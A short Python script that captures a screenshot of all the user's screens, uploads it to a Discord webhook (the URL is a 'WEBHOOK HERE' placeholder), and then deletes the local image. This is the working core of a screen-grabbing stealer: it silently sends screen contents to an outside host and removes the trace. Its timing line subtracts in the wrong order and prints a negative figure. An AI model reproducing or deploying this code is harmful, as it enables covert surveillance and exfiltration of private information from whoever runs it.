import discord_webhook, os, time
from PIL import ImageGrab
start = time.time()
try:
    os.remove("Screenshot.png")
except:
    pass

webhook = discord_webhook.DiscordWebhook(url='WEBHOOK HERE', username="Webhook with files")

image = ImageGrab.grab(
        bbox=None,
        include_layered_windows=False,
        all_screens=True,
        xdisplay=None
    )
image.save("Screenshot.png")
image.close()

with open("Screenshot.png", "rb") as f:
    webhook.add_file(file=f.read(), filename='Screenshot.jpg')

response = webhook.execute()
os.remove("Screenshot.png")
end = time.time()
total = start - end
print(total)
